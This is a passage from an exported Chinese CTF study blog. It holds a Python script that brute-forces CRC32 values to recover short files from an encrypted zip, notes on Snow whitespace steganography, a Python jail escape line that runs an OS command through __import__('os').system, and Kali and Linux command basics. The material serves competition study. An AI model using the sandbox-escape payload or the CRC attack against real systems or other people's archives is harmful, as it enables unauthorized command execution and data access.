title="0xgame2025"></a>0xgame2025</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/zip/42988179/1761285841916-e83cafc5-50fc-4eec-ad7c-9140046ccc53.zip">attachment.zip</a></p><p><img src="/./img/49277317_6GY5tIlciQZFzNQi/1761285854058-17e44282-7324-431a-a014-4ab2ee2c8651-658424.png" alt="1761285854058-17e44282-7324-431a-a014-4ab2ee2c8651.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 自动读取爆破加密zip所有1-4字节文件CRC，输出文件名(密码段顺序)和结果<br># 如果个别文件爆破失败，修改multiCrack中dic字典变量即可<br>from zipfile import ZipFile<br>import itertools, binascii, re<br><br>def permutations_with_replacement(szDic, k):<br>    # 注意：此函数会产生非常大的列表（内存占用高），如果数据量大建议改成生成器版本<br>    result = []<br>    for i in itertools.product(szDic, repeat = k):<br>        result.append(&#x27;&#x27;.join(i))<br>    return result<br><br>def multiCrack(iSize, lCrcs):<br>    # 根据需要修改 dic 字符集<br>    dic = &#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!-@_&#123;&#125;&#x27;&#x27;&#x27;<br>    # 更宽泛字符集（若需要）：<br>    # dic = &#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &#x27;&#x27;&#x27;<br>    dResult = &#123;&#125;<br>    mydic = permutations_with_replacement(dic, iSize)<br>    mask = 0xFFFFFFFF<br>    for txt in mydic:<br>        crc = str(binascii.crc32(txt.encode()) &amp; mask)<br>        if crc in lCrcs:<br>            print(f&quot;FOUND CRC &#123;hex(int(crc))&#125; -&gt; &#123;txt&#125;&quot;)<br>            dResult[crc] = txt<br>            # 如果对同一 crc 只需要第一个匹配，这里可以选择继续或 break<br>    return dResult<br><br>def crack(lFilesCRC):<br>    &quot;&quot;&quot;<br>    lFilesCRC: 列表，每项格式 &#x27;filename|size|CRC&#x27;<br>    返回：列表形式的匹配结果和一个 filename-&gt;plaintext 的字典<br>    &quot;&quot;&quot;<br>    matches_list = []<br>    found_map = &#123;&#125;  # filename -&gt; plaintext<br><br>    # 收集所有待爆破长度<br>    iSizes = set([int(i.split(&#x27;|&#x27;)[1]) for i in lFilesCRC])<br>    for iSize in iSizes:<br>        # 当前长度对应的所有 crc 字符串<br>        lCrcs = [i.split(&#x27;|&#x27;)[2] for i in lFilesCRC if i.split(&#x27;|&#x27;)[1] == str(iSize)]<br>        dTMP = multiCrack(iSize, lCrcs)<br>        # 把找到的 crc 结果分配回对应文件名<br>        for entry in lFilesCRC:<br>            fname, fsize, fcrc = entry.split(&#x27;|&#x27;)<br>            if fcrc in dTMP:<br>                found_map[fname] = dTMP[fcrc]<br>                matches_list.append(f&quot;&#123;entry&#125; &#123;dTMP[fcrc]&#125;&quot;)<br><br>    return matches_list, found_map<br><br>def make_concatenation(filelist, found_map):<br>    &quot;&quot;&quot;<br>    按数字顺序（如果文件名是数字开头，例如 1.txt）拼接明文段。<br>    未找到的文件会以 &lt;MISSING:filename&gt; 占位。<br>    返回 (concatenated_string, missing_files_list)<br>    &quot;&quot;&quot;<br>    # 试着提取文件名前面的数字，作为排序键；否则按字典序<br>    def keyfn(fname):<br>        m = re.match(r&#x27;(\d+)&#x27;, fname)<br>        return (0, int(m.group(1))) if m else (1, fname)<br><br>    sorted_files = sorted(filelist, key=keyfn)<br>    parts = []<br>    missing = []<br>    for fname in sorted_files:<br>        if fname in found_map:<br>            parts.append(found_map[fname])<br>        else:<br>            parts.append(f&quot;&lt;MISSING:&#123;fname&#125;&gt;&quot;)<br>            missing.append(fname)<br>    concat = &#x27;&#x27;.join(parts)<br>    return concat, missing<br><br>if __name__ == &quot;__main__&quot;:<br>    zip_path = r&quot;attachment.zip&quot;<br>    myzip = ZipFile(zip_path)<br>    fInfos = myzip.filelist<br>    lFilesCRC = []<br><br>    # 仅处理 file_size &lt; 5 的短文件（1-4 字节）<br>    for fInfo in fInfos:<br>        if fInfo.file_size &lt; 5:<br>            # 格式“文件名|原始大小|CRC”——如“1.txt|4|3463500836”<br>            lFilesCRC.append(fInfo.filename + &#x27;|&#x27; + str(fInfo.file_size) + &#x27;|&#x27; + str(fInfo.CRC))<br><br>    # 执行爆破<br>    matches_list, found_map = crack(lFilesCRC)<br><br>    # 输出逐文件的匹配结果<br>    print(&quot;==== 单段匹配结果 ====&quot;)<br>    for m in sorted(matches_list):<br>        print(m)<br><br>    # 输出拼接明文（按文件名顺序）<br>    filelist = [i.split(&#x27;|&#x27;)[0] for i in lFilesCRC]<br>    concat, missing = make_concatenation(filelist, found_map)<br>    print(&quot;\n==== 拼接结果 ====&quot;)<br>    print(concat)<br><br>    if missing:<br>        print(&quot;\n以下文件未找到对应明文：&quot;)<br>        for m in missing:<br>            print(&quot; -&quot;, m)<br>    else:<br>        print(&quot;\n所有段已找到。&quot;)<br><br>    # 如果你想把拼接结果保存为文件，取消下面注释：<br>    # with open(&quot;concatenated_plain.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as fw:<br>    #     fw.write(concat)<br><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-10-24 14:10:39<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lypn3qqshgcl8lah">https://www.yuque.com/chaye-apqbl/vsc85q/lypn3qqshgcl8lah</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/Snow%E9%9B%AA/"/>
    <url>/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/Snow%E9%9B%AA/</url>
    
    <content type="html"><![CDATA[<h1 id="Snow雪"><a href="#Snow雪" class="headerlink" title="Snow雪"></a>Snow雪</h1><p><a href="https://blog.csdn.net/qq_53079406/article/details/123810053">【HTML中隐写】Snow免安装、网站版，基本使用方法_snow隐写-CSDN博客</a></p><p>snow -C -p “xxx” filename</p><h1 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h1><p>-C</p><p>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</p><p>-Q</p><p>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</p><p>-S</p><p>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</p><p>-p password</p><p>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</p><p>-l line-length</p><p>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</p><p>-f message-file</p><p>此文件的内容将隐藏在输入文本文件中。</p><p>-m message-string</p><p>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</p><h1 id="Examples（例子）"><a href="#Examples（例子）" class="headerlink" title="Examples（例子）"></a>Examples（例子）</h1><p>以下命令将隐藏文件infile中的消息“I am lying”中，压缩，并使用密码“Hello World”加密。生成的文本将被存储在外档中。</p><p>snow -C -m “I am lying” -p “hello world” infile outfile</p><p>要提取消息，命令将是</p><p>snow -C -p “hello world” outfile</p><p>请注意，生成的消息不会被换行符终止。</p><p>为防止线包装，如果通过邮件或新闻读卡器缩进隐藏空间的文本，可以使用72或更小的线长度。</p><p>snow -C -l 72 -m “I am lying” infile outfile</p><p>可以使用-s选项确定文件的近似存储容量。</p><p>snow -S -l 72 infile</p><h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">第一步：</font></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">先将文件都放在Snow文件夹中，再进行操作</font></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">原始文件也留一个做对比</font></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516262056-f5141e85-982d-4f62-ad6a-0e72bedecf65-595553.png" alt="1730516262056-f5141e85-982d-4f62-ad6a-0e72bedecf65.png"></p><p><font style="color:rgb(79, 79, 79);">第二步：先进入到文件夹中</font></p><p><font style="color:rgb(79, 79, 79);">然后再执行隐写命令</font></p><p><font style="color:rgb(79, 79, 79);">snow.exe -C -m “flag” -p “123456” test.html</font></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516278922-8367041a-2052-474d-9ab6-54bbe0e2dee7-855805.png" alt="1730516278922-8367041a-2052-474d-9ab6-54bbe0e2dee7.png"></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">这里显示压缩了34.38%</font></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516311489-4035423b-1d95-4d33-9cb7-e0d6459b7246-716990.png" alt="1730516311489-4035423b-1d95-4d33-9cb7-e0d6459b7246.png"></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">最后显示：消息使用大约1.60％的可用空间。</font></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516328589-3f583f4e-d69f-43c6-89ae-64f578c2fb02-490616.png" alt="1730516328589-3f583f4e-d69f-43c6-89ae-64f578c2fb02.png"></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"></font></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="看雪看雪看雪"><a href="#看雪看雪看雪" class="headerlink" title="看雪看雪看雪"></a>看雪看雪看雪</h2><p>看着是16进制，转成字符串<img src="/./img/yVUhsolxQtDNBM-d/1730514375667-01f2b8e2-a0b4-4696-8d5f-b4c9e5052dfc-823940.png" alt="1730514375667-01f2b8e2-a0b4-4696-8d5f-b4c9e5052dfc.png"></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730514456590-82060d58-8b92-4756-a732-d68b5d9dc771-716424.png" alt="1730514456590-82060d58-8b92-4756-a732-d68b5d9dc771.png"></p><p>直接打开rar，放到7zip里面看一下</p><p><img src="/./img/yVUhsolxQtDNBM-d/1730515792883-68ebc3c4-f1b5-4019-b964-f23e9690c106-761965.png" alt="1730515792883-68ebc3c4-f1b5-4019-b964-f23e9690c106.png"></p><p><img src="/./img/yVUhsolxQtDNBM-d/1730515855894-16330991-1ce8-4095-baae-f79dda552885-869756.png" alt="1730515855894-16330991-1ce8-4095-baae-f79dda552885.png"></p><p>key是他朝若是同淋雪</p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516023113-79d109fd-195c-40d3-abda-938229a25257-714050.png" alt="1730516023113-79d109fd-195c-40d3-abda-938229a25257.png"></p><p>放到snow里面</p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516102071-e2e78419-300b-4e15-b392-55fc18a6755d-380542.png" alt="1730516102071-e2e78419-300b-4e15-b392-55fc18a6755d.png"></p><p>.\SNOW.exe - C -p 他朝若是同淋雪 flag.txt</p><p><img src="/./img/yVUhsolxQtDNBM-d/1730516916400-5ad91e9f-f381-4cbb-bdf5-79b5a5cd2fbc-391971.png" alt="1730516916400-5ad91e9f-f381-4cbb-bdf5-79b5a5cd2fbc.png"></p><blockquote><p>更新: 2025-04-20 18:45:46<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ve9svpa6y8m82trf">https://www.yuque.com/chaye-apqbl/vsc85q/ve9svpa6y8m82trf</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/ook/"/>
    <url>/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/ook/</url>
    
    <content type="html"><![CDATA[<h1 id="ook"><a href="#ook" class="headerlink" title="ook"></a>ook</h1><blockquote><p>更新: 2025-05-28 10:07:14<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/crl29si87ldix3ld">https://www.yuque.com/chaye-apqbl/vsc85q/crl29si87ldix3ld</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/index/"/>
    <url>/2026/01/19/MISC/txt%E5%8A%A0%E5%AF%86/index/</url>
    
    <content type="html"><![CDATA[<h1 id="txt加密"><a href="#txt加密" class="headerlink" title="txt加密"></a>txt加密</h1><blockquote><p>更新: 2024-11-13 14:52:43<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/nz0mcn307sb9cad0">https://www.yuque.com/chaye-apqbl/vsc85q/nz0mcn307sb9cad0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/Pythonjail%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
    <url>/2026/01/19/MISC/Pythonjail%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-jail沙盒逃逸"><a href="#Python-jail沙盒逃逸" class="headerlink" title="Python jail沙盒逃逸"></a>Python jail沙盒逃逸</h1><p><a href="https://blog.csdn.net/uuzeray/article/details/138138254">【Web】随便写写的pyjail刷题记录(1)_pyjail1-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/12093">https://xz.aliyun.com/news/12093</a></p><h1 id="任意linux命令"><a href="#任意linux命令" class="headerlink" title="任意linux命令"></a>任意linux命令</h1><p><strong>import</strong>(“os”).system(“cat flag”)</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><blockquote><p>更新: 2025-09-22 20:56:29<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/nrzp10sb12kx7imy">https://www.yuque.com/chaye-apqbl/vsc85q/nrzp10sb12kx7imy</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/%E6%8D%A2%E6%BA%90/"/>
    <url>/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/%E6%8D%A2%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p><a href="https://blog.csdn.net/weixin_62808713/article/details/130372239?ops_request_misc=%257B%2522request%255Fid%2522%253A%252275710E19-7DEF-4E5D-8742-DC68FA9F949F%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=75710E19-7DEF-4E5D-8742-DC68FA9F949F&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-130372239-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=kali%E6%8D%A2%E6%BA%90&spm=1018.2226.3001.4187">Kali 更换源（超详细，附国内优质镜像源地址）_kali换源-CSDN博客</a></p><p>vim &#x2F;etc&#x2F;apt&#x2F;sources.list</p><p>中科大Kali镜像源</p><p>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>阿里云Kali镜像源</p><p>deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p><p>deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p><p>清华大学Kali镜像源</p><p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p><p>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p><p>命令1：</p><p>apt-get upgrade</p><p>命令2：</p><p>apt-get dist-upgrade</p><p>上面两条命令均是用来更新所有软件的，不同的是：</p><p>它能识别新版本的依赖关系，</p><p>将不要的依赖进行卸载，</p><p>将需要升级的依赖进行升级。</p><p>安装或更新完成后，会遗留一些软件的安装包，会占用部分硬盘空间，可使用下面的命令来对其进行清理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get clean<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-11-08 13:20:50<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/oa5rbfzwi8xz4zkx">https://www.yuque.com/chaye-apqbl/vsc85q/oa5rbfzwi8xz4zkx</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/index/"/>
    <url>/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/index/</url>
    
    <content type="html"><![CDATA[<h1 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h1><p>下面是 <code>ls</code>、<code>cd</code>、<code>cat</code>、<code>grep</code> 和 <code>chmod</code> 命令的详细用法和例子。这些命令是 Linux 中常用的命令，主要用于文件和目录的管理、查看和操作。</p><hr><h3 id="1-ls（List-Directory-Contents）"><a href="#1-ls（List-Directory-Contents）" class="headerlink" title="1. ls（List Directory Contents）"></a>1. <code>ls</code>（List Directory Contents）</h3><p><strong>用法</strong>：<code>ls [选项] [目录]</code>  </p><p>列出指定目录的内容（文件和子目录）。如果没有指定目录，则列出当前目录的内容。</p><p><strong>常用选项</strong>：</p><ul><li><p><code>-l</code>：以长格式显示文件信息（包括权限、所有者、大小、修改时间等）。</p></li><li><p><code>-a</code>：显示所有文件，包括隐藏文件（以 <code>.</code> 开头的文件）。</p></li><li><p><code>-h</code>：以人类可读的格式显示文件大小（结合 <code>-l</code> 使用）。</p></li><li><p><code>-R</code>：递归地列出子目录中的内容。</p></li><li><p><code>-t</code>：按修改时间排序。</p></li></ul><p><strong>例子</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">ls</span>               <span class="hljs-comment"># 列出当前目录的文件和子目录</span><br><br><span class="hljs-built_in">ls</span> -l            <span class="hljs-comment"># 以长格式显示</span><br><br><span class="hljs-built_in">ls</span> -a            <span class="hljs-comment"># 显示所有文件，包括隐藏文件</span><br><br><span class="hljs-built_in">ls</span> -lh           <span class="hljs-comment"># 以人类可读的文件大小显示</span><br><br><span class="hljs-built_in">ls</span> -R            <span class="hljs-comment"># 递归地显示所有子目录</span><br><br></code></pre></td></tr></table></figure><hr><h3 id="2-cd（Change-Directory）"><a href="#2-cd（Change-Directory）" class="headerlink" title="2. cd（Change Directory）"></a>2. <code>cd</code>（Change Directory）</h3><p><strong>用法</strong>：<code>cd [目录]</code>  </p><p>用于更改当前工作目录。</p><p><strong>常用形式</strong>：</p><ul><li><p><code>cd ..</code>：回到上一级目录。</p></li><li><p><code>cd /path/to/directory</code>：进入指定路径的目录。</p></li><li><p><code>cd ~</code> 或 <code>cd</code>：进入用户的主目录。</p></li><li><p><code>cd -</code>：返回上一次所在的目录。</p></li></ul><p><strong>例子</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">cd</span> /home/user/Documents     <span class="hljs-comment"># 切换到 /home/user/Documents 目录</span><br><br><span class="hljs-built_in">cd</span> ..                       <span class="hljs-comment"># 回到上一级目录</span><br><br><span class="hljs-built_in">cd</span> ~                        <span class="hljs-comment"># 切换到当前用户的主目录</span><br><br><span class="hljs-built_in">cd</span> -                        <span class="hljs-comment"># 返回上一个目录</span><br><br></code></pre></td></tr></table></figure><hr><h3 id="3-cat（Concatenate-and-Display-Files）"><a href="#3-cat（Concatenate-and-Display-Files）" class="headerlink" title="3. cat（Concatenate and Display Files）"></a>3. <code>cat</code>（Concatenate and Display Files）</h3><p><strong>用法</strong>：<code>cat [选项] [文件]</code>  </p><p>用于查看文件内容、连接多个文件、创建文件等。</p><p><strong>常用选项</strong>：</p><ul><li><p><code>-n</code>：为每一行加上行号。</p></li><li><p><code>&gt; filename</code>：将内容写入指定文件（覆盖原文件）。</p></li><li><p><code>&gt;&gt; filename</code>：将内容追加到指定文件。</p></li><li><p><code>cat file1 file2 &gt; combinedfile</code>：将两个文件的内容合并输出到新文件中。</p></li></ul><p><strong>例子</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">cat</span> file.txt                <span class="hljs-comment"># 显示 file.txt 的内容</span><br><br><span class="hljs-built_in">cat</span> -n file.txt             <span class="hljs-comment"># 显示带有行号的文件内容</span><br><br><span class="hljs-built_in">cat</span> file1.txt file2.txt     <span class="hljs-comment"># 显示两个文件的内容</span><br><br><span class="hljs-built_in">cat</span> file1.txt &gt; newfile.txt <span class="hljs-comment"># 将 file1.txt 的内容覆盖写入 newfile.txt</span><br><br><span class="hljs-built_in">cat</span> file2.txt &gt;&gt; newfile.txt <span class="hljs-comment"># 将 file2.txt 的内容追加到 newfile.txt</span><br><br></code></pre></td></tr></table></figure><hr><h3 id="4-grep（Global-Regular-Expression-Print）"><a href="#4-grep（Global-Regular-Expression-Print）" class="headerlink" title="4. grep（Global Regular Expression Print）"></a>4. <code>grep</code>（Global Regular Expression Print）</h3><p><strong>用法</strong>：<code>grep [选项] PATTERN [文件]</code>  </p><p>用于在文件中搜索符合特定模式的行，并输出包含该模式的行。</p><p><strong>常用选项</strong>：</p><ul><li><p><code>-i</code>：忽略大小写。</p></li><li><p><code>-r</code>：递归搜索子目录。</p></li><li><p><code>-n</code>：显示匹配的行号。</p></li><li><p><code>-v</code>：显示不匹配的行。</p></li><li><p><code>--color</code>：高亮显示匹配的模式。</p></li></ul><p><strong>例子</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>grep <span class="hljs-string">&quot;hello&quot;</span> file.txt              <span class="hljs-comment"># 搜索文件中包含 &quot;hello&quot; 的行</span><br><br>grep -i <span class="hljs-string">&quot;hello&quot;</span> file.txt           <span class="hljs-comment"># 忽略大小写进行搜索</span><br><br>grep -r <span class="hljs-string">&quot;pattern&quot;</span> /path/to/dir     <span class="hljs-comment"># 递归搜索目录及子目录中的文件</span><br><br>grep -n <span class="hljs-string">&quot;error&quot;</span> logfile.txt        <span class="hljs-comment"># 搜索并显示匹配行的行号</span><br><br>grep -v <span class="hljs-string">&quot;success&quot;</span> logfile.txt      <span class="hljs-comment"># 显示不包含 &quot;success&quot; 的行</span><br><br>grep --color <span class="hljs-string">&quot;keyword&quot;</span> file.txt    <span class="hljs-comment"># 高亮显示匹配到的关键词</span><br><br></code></pre></td></tr></table></figure><hr><h3 id="5-chmod（Change-File-Mode）"><a href="#5-chmod（Change-File-Mode）" class="headerlink" title="5. chmod（Change File Mode）"></a>5. <code>chmod</code>（Change File Mode）</h3><p><strong>用法</strong>：<code>chmod [选项] 模式 文件</code>  </p><p>用于更改文件或目录的权限。</p><p><strong>常用形式</strong>：</p><ul><li><p><code>chmod u+x filename</code>：为文件所有者增加执行权限。</p></li><li><p><code>chmod g-w filename</code>：移除文件所在组的写权限。</p></li><li><p><code>chmod o+r filename</code>：为其他用户增加读取权限。</p></li><li><p><code>chmod 755 filename</code>：设置权限为所有者可读写执行，组和其他用户可读和执行（<code>7</code> 是 <code>rwx</code>，<code>5</code> 是 <code>r-x</code>）。</p></li></ul><p>权限使用符号：</p><ul><li><p><code>u</code>：所有者（user）。</p></li><li><p><code>g</code>：组（group）。</p></li><li><p><code>o</code>：其他用户（others）。</p></li><li><p><code>r</code>：读权限（read）。</p></li><li><p><code>w</code>：写权限（write）。</p></li><li><p><code>x</code>：执行权限（execute）。</p></li></ul><p><strong>例子</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">chmod</span> u+x script.sh          <span class="hljs-comment"># 允许文件所有者执行该脚本</span><br><br><span class="hljs-built_in">chmod</span> g-w file.txt           <span class="hljs-comment"># 移除组的写权限</span><br><br><span class="hljs-built_in">chmod</span> o+r file.txt           <span class="hljs-comment"># 允许其他用户读取该文件</span><br><br><span class="hljs-built_in">chmod</span> 755 script.sh          <span class="hljs-comment"># 赋予所有者读写执行权限，组和其他用户读和执行权限</span><br><br><span class="hljs-built_in">chmod</span> -R 700 /path/to/dir    <span class="hljs-comment"># 递归地为目录及其所有内容设置权限</span><br><br></code></pre></td></tr></table></figure><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p><strong><code>ls</code></strong>：列出目录内容，显示文件的详细信息。</p></li><li><p><strong><code>cd</code></strong>：更改当前工作目录。</p></li><li><p><strong><code>cat</code></strong>：显示文件内容或将多个文件合并。</p></li><li><p><strong><code>grep</code></strong>：在文件中搜索指定的文本模式。</p></li><li><p><strong><code>chmod</code></strong>：更改文件或目录的权限。</p></li></ul><p>这些命令组合起来，可以有效地管理 Linux 系统中的文件和目录，执行各种操作。</p><blockquote><p>更新: 2024-09-26 11:11:16<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ld1pu324asxymcsv">https://www.yuque.com/chaye-apqbl/vsc85q/ld1pu324asxymcsv</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/exportPATH=_$HOME_.local_bin_$PATH_/"/>
    <url>/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/exportPATH=_$HOME_.local_bin_$PATH_/</url>
    
